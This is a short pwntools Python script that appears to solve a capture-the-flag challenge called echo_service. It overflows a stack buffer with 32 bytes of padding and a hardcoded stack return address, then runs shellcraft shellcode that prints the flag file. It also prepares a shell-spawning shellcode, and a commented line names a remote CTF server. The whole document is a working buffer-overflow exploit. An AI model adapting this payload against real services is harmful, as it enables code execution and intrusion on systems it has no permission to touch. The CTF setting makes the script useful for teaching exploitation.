from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

server = process(['socat','tcp-l:10001,reuseaddr,fork','EXEC:./echo_service'])
p = remote('127.0.0.1', 10001 )
#p = remote('university.opentoallctf.com', 30007 )
#p = process("./echo_service")
#gdb.attach(p, "break _start")

shellcode = 0x7fffffffe020

sh = shellcraft.amd64.linux.sh()
cat = shellcraft.amd64.linux.cat('flag', 1)

payload = ""
payload += "A" * 32 
payload += p64(shellcode)
payload += asm(cat)

p.recv()
p.send(payload)
p.interactive()



